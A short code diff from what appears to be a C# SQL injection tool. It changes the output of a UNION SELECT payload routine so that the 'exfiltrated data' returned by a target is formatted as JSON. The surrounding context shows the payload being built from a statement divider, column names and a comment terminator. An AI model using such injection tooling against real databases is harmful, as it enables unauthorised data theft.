@@ -208,7 +208,7 @@ namespace Injection
 			payload = statementDividor + unionSelect + string.Join(", ", columns) + from + comment;
 			string responseContentFinal = await TestPayload(client, path, payload);
 			Color("Final payload with exfiltrated data: ", ConsoleColor.Green);
-			Console.WriteLine(responseContentFinal);
+			Console.WriteLine(FormatJson(responseContentFinal));
 		}
 
 		public static async Task<string> TestPayload(HttpClient client, string path, string payload)
